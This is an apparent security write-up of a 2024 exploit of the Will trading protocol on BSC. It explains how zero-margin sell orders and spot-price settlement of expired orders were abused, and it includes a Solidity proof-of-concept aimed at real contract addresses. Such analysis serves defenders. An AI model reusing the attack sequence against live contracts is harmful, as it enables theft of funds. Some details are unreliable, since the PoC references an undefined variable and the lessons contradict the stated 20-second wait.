# Will — placeSellOrder() + updateExpiredOrders() Expired Order Settlement Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | Will (Trading Protocol) |
| **Chain** | BSC |
| **Loss** | ~$52,777 |
| **Trading Contract** | [0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF](https://bscscan.com/address/0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF) |
| **WILL Token** | [0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d](https://bscscan.com/address/0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Attacker** | [0xb6911dee6a5b1c65ad1ac11a99aec09c2cf83c0e](https://bscscan.com/address/0xb6911dee6a5b1c65ad1ac11a99aec09c2cf83c0e) |
| **Attack Contract** | [0x63b4de190c35f900bb7adf1a13d66fb1f0d624a1](https://bscscan.com/address/0x63b4de190c35f900bb7adf1a13d66fb1f0d624a1) |
| **Root Cause** | `placeSellOrder()` allows order creation with zero margin, and `updateExpiredOrders()` + `settleExpiredPositions()` settle expired orders at a price-favorable rate, enabling theft of WILL token sale profits |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Will_exp.sol) |

---

## 1. Vulnerability Overview

The `placeSellOrder()` function of the Will trading protocol allows creation of sell orders with zero margin (collateral) without any margin validation. The attacker created a sell order worth 71,000 USDT with 0 margin, then swapped 88,000 USDT for WILL tokens to manipulate the market price. After 20 seconds, they called `updateExpiredOrders()` to mark the order as expired, then used `settleExpiredPositions()` to settle the position at the manipulated price, stealing approximately $52.8K.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: placeSellOrder allows zero margin
contract TradingProtocol {
    struct Order {
        address trader;
        uint256 amount;
        uint256 margin;
        uint256 price;
        uint256 expiry;
        bool settled;
    }
    Order[] public orders;

    function placeSellOrder(
        uint256 amount,
        uint256 margin,  // 0 allowed — no validation
        uint256 price
    ) external {
        // No minimum margin validation
        USDT.transferFrom(msg.sender, address(this), margin); // no transfer if 0
        orders.push(Order(msg.sender, amount, margin, price, block.timestamp + 20 seconds, false));
    }

    function updateExpiredOrders() external {
        for (uint i = 0; i < orders.length; i++) {
            if (block.timestamp >= orders[i].expiry && !orders[i].settled) {
                orders[i].settled = true;
                // Mark as expired — settle without price validation
            }
        }
    }

    function settleExpiredPositions() external {
        for (uint i = 0; i < orders.length; i++) {
            if (orders[i].settled) {
                // Settle at current market price (manipulable)
                uint256 currentPrice = getSpotPrice(); // WILL spot price
                uint256 profit = calculateProfit(orders[i], currentPrice);
                USDT.transfer(orders[i].trader, profit);
            }
        }
    }
}

// ✅ Safe code
function placeSellOrder(uint256 amount, uint256 margin, uint256 price) external {
    require(margin >= MIN_MARGIN_RATIO * amount / 100, "insufficient margin");
    require(amount > 0 && price > 0, "invalid params");
    USDT.transferFrom(msg.sender, address(this), margin);
    orders.push(Order(msg.sender, amount, margin, price, block.timestamp + MIN_ORDER_DURATION, false));
}

function settleExpiredPositions() external {
    // Use TWAP price (defense against spot price manipulation)
    uint256 twapPrice = getTWAPPrice();
    // ...
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Will_decompiled.sol
contract Will {
    function placeSellOrder(uint256 p0, uint256 p1, uint256 p2) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] USDT.approve(trading, maxAmount)
  │
  ├─→ [2] trading.placeSellOrder(71,000 USDT, margin=0, price)
  │         └─ No margin validation → zero margin order created
  │         └─ expiry = block.timestamp + 20 seconds
  │
  ├─→ [3] Router.swapExactTokensForTokens(88,000 USDT → WILL)
  │         └─ Large WILL purchase → WILL price increases
  │
  ├─→ [4] Wait 20 seconds (vm.warp +20s)
  │         └─ Order expiry time reached
  │
  ├─→ [5] trading.updateExpiredOrders()
  │         └─ Order marked as expired (settled = true)
  │
  ├─→ [6] trading.settleExpiredPositions()
  │         └─ Settle at manipulated WILL spot price
  │         └─ USDT paid out in attacker's favor
  │
  ├─→ [7] Held WILL → swap back to USDT
  │
  └─→ [8] ~$52.8K profit
```

## 4. PoC Code (Core Logic with English Comments)

```solidity
interface ITrading {
    function placeSellOrder(uint256 amount, uint256 margin, uint256 price) external;
    function updateExpiredOrders() external;
    function settleExpiredPositions() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

contract AttackContract {
    ITrading constant trading = ITrading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);
    IERC20 constant WILL = IERC20(0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Router constant router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() external {
        // [1] Create zero margin sell order (71,000 USDT notional)
        USDT.approve(address(trading), type(uint256).max);
        trading.placeSellOrder(71_000e18, 0, currentPrice); // margin = 0

        // [2] Swap 88,000 USDT → WILL (manipulate WILL price upward)
        USDT.approve(address(router), 88_000e18);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WILL);
        router.swapExactTokensForTokens(88_000e18, 0, path, address(this), block.timestamp);

        // [3] Advance 20 seconds (test: vm.warp(block.timestamp + 20))

        // [4] Update expired orders + settle
        trading.updateExpiredOrders();
        trading.settleExpiredPositions(); // Settle at manipulated price → excess USDT received

        // [5] Swap held WILL back to USDT
        uint256 willBal = WILL.balanceOf(address(this));
        WILL.approve(address(router), willBal);
        address[] memory path2 = new address[](2);
        path2[0] = address(WILL);
        path2[1] = address(USDT);
        router.swapExactTokensForTokens(willBal, 0, path2, address(this), block.timestamp);
        // ~$52.8K profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing margin validation + spot price manipulation at settlement |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (placeSellOrder zero margin + price manipulation + expired order settlement) |
| **DApp Category** | Derivatives / Perpetual Trading Protocol |
| **Impact** | Zero margin order + price manipulation → $52.8K stolen |

## 6. Remediation Recommendations

1. **Enforce minimum margin**: Add `require(margin >= amount * MIN_MARGIN_RATE / 100)`
2. **Use TWAP pricing**: Use TWAP instead of spot price at settlement to defend against instantaneous manipulation
3. **Minimum order expiry duration**: A 20-second expiry is far too short — set a minimum of several minutes or more
4. **Continuous margin ratio validation**: Validate margin ratio at both position open and settlement

## 7. Lessons Learned

- In derivatives protocols, allowing order creation without margin validation enables a risk-free attack position.
- A short expiry window (20 seconds) allows the full attack to complete within the same block without any timestamp manipulation.
- Using spot price instead of TWAP for settlement makes the protocol manipulable via a simple large swap, even without a flash loan.